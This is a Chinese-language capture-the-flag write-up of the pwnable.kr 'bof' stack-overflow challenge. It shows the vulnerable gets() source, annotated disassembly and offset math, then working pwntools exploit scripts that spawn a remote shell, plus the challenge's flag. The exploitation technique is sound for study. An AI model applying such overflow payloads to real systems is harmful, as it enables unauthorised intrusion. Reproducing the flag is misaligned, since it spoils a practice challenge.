源程序如下

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```

就是 `overflow` 这个数组会发生溢出, 使用 r2 查看它的反汇编代码如下

```
[0x0000062c]> pdf @ sym.main
            ;-- main:
┌ (fcn) sym.main 28
│   sym.main (int argc, char **argv, char **envp);
│           0x0000068a      55             push ebp
│           0x0000068b      89e5           mov ebp, esp
│           0x0000068d      83e4f0         and esp, 0xfffffff0
│           0x00000690      83ec10         sub esp, 0x10

=> main 函数中调用 func 时通过 esp 传递参数 0xdeadbeef:

│           0x00000693      c70424efbead.  mov dword [esp], 0xdeadbeef ; [0xdeadbeef:4]=-1
│           0x0000069a      e88dffffff     call sym.func
│           0x0000069f      b800000000     mov eax, 0
│           0x000006a4      c9             leave
└           0x000006a5      c3             ret

[0x0000062c]> pdf
┌ (fcn) sym.func 94
│   sym.func (unsigned int arg_8h);
│           ; var int local_2ch @ ebp-0x2c
│           ; var int local_ch @ ebp-0xc
│           ; arg unsigned int arg_8h @ ebp+0x8
│           ; XREFS: CALL 0x00000644  CALL 0x0000064f  CALL 0x00000664  CALL 0x00000672  CALL 0x00000683  CALL 0x0000069a

=> 进入 func 函数体,先是在栈上开辟 0x48 的空间大小, 然后 gs:[0x14] 获取 canary, 放入 local_ch 中:

│           0x0000062c      55             push ebp
│           0x0000062d      89e5           mov ebp, esp
│           0x0000062f      83ec48         sub esp, 0x48               ; 'H'
│           0x00000632      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
│           0x00000638      8945f4         mov dword [local_ch], eax
│           0x0000063b      31c0           xor eax, eax

│           0x0000063d      c704248c0700.  mov dword [esp], str.overflow_me_: ; [0x78c:4]=0x7265766f ; "overflow me : "; RELOC 32
│           0x00000644      e8fcffffff     call 0x645                  ; RELOC 32 puts

=> esp 中放入存放用户数据的数组地址, gets 执行后, 将会填充数组, 这里就是发生溢出的地方

│           0x00000649      8d45d4         lea eax, [local_2ch]
│           0x0000064c      890424         mov dword [esp], eax
│           0x0000064f      e8fcffffff     call 0x650                  ; RELOC 32 gets
│           0x00000654      817d08bebafe.  cmp dword [arg_8h], 0xcafebabe ; [0xcafebabe:4]=-1

│       ┌─< 0x0000065b      750e           jne 0x66b
│       │   0x0000065d      c704249b0700.  mov dword [esp], str.bin_sh ; [0x79b:4]=0x6e69622f ; "/bin/sh"; RELOC 32
│       │   0x00000664      e8fcffffff     call 0x665                  ; RELOC 32 system
│      ┌──< 0x00000669      eb0c           jmp 0x677
│      ││   ; CODE XREF from sym.func (0x65b)
│      │└─> 0x0000066b      c70424a30700.  mov dword [esp], str.Nah..  ; [0x7a3:4]=0x2e68614e ; "Nah.."; RELOC 32
│      │    0x00000672      e8fcffffff     call 0x673                  ; RELOC 32 puts
│      │    ; CODE XREF from sym.func (0x669)
│      └──> 0x00000677      8b45f4         mov eax, dword [local_ch]
│           0x0000067a      653305140000.  xor eax, dword gs:[0x14]
│       ┌─< 0x00000681      7405           je 0x688
│       │   0x00000683      e8fcffffff     call 0x684                  ; RELOC 32 __stack_chk_fail
│       │   ; CODE XREF from sym.func (0x681)
│       └─> 0x00000688      c9             leave
└           0x00000689      c3             ret
```

在执行到 gets 函数时, 栈顶存放的是数组 overflow 的首地址, 其值 `ebp - 0x2c`,
因此 `*(char *)(ebp - 0x2c)` 就是我们的第一个字符, 依次的 `ebp - 0x2c + 0x4` 处就是第 2 个字符,
而我们要溢出覆盖到 main 传递给 func 的参数, 该参数值位于 ebp + 0x8 处,
因此从 overflow 数组首地址, 我们要填充 0x2c + 0x8 个字节大小, 才能抵达 main 传递给 func 的
参数处, 然后再覆盖四个字节, 这最后四个字节, 我们需要控制为 0xcafebabe 即可完成攻击.

对于多字节数据, 比如一个四字节整形, 假设其内存地址为 0x00400000,
那么 CPU 总是向高地址处读取四字节, 然后根据机器端序来形成十六进制的数据,
如果是大端序, 则 MSB 位于最低地址处, 如果是小段序, 则 LSB 位于最低地址处.

由于数组 overflow 从低地址到高地址依次存放收到的数据, 因此溢出后, 如果要控制最后四个字节
为 0xcafebabe, 那么在小段序上就要求从低地址到高地址依次为 0xbe 0xba 0xfe 0xca.

所以我们的 payload 就是 `(0x2C + 0x8 ) * 'A' + '\xbe\xba\xfe\xca'`.
用 python3 结合 pwntools 来写就是

```
#! /usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

io = process('./bof')
gdb.attach(io)
print(io.recvline())
pad = b'A' * (0x2c + 0x8)
input("Send palyload?")
#io.send(pad + b'\x90\x90\x90\x90')
io.sendline(pad + p32(0xcafebabe))
io.interactive()

```

因为我是第一次接触 pwntools, 记录一下如何结合 gdb 进行调试:

上面使用 context 来设置启动 gdb 的终端, 我设置为了 tmux, 新开一个垂直划分的窗口,
在 gdb.attach 执行后, 就会在 tmux 的新窗口中启动一个已经载入调试程序的会话,
然后 input 用于暂停脚本执行, 此时我们可以进入 gdb 进行调试, 设置断点等操作,
等完成操作后, 在 gdb 中按下 `c`, 回到 pwntools 脚本执行窗口, 按下回车,
即可继续执行 pwntools 脚本, 比如这里就是发送 payload 给调试程序.

第二个问题是 python3 中, '\x90' 并不是一个字节, 而是一个字符串,
如果想表示一个字节, 必须是 b'\x90', 否则你发送到程序中的字节会被 utf-8 编码为  `\x2c\x90`,
这导致错误的 payload, 这和 python2 不一样, 务必注意.

当在本地调试完之后, 就可以远程连接了

```
#! /usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *

io = remote('pwnable.kr', 9000)
pad = b'A' * (0x2c + 0x8)
io.sendline(pad + p32(0xcafebabe))
io.interactive()
```

结果如下

```
$ python3 exp.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
log2
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
```
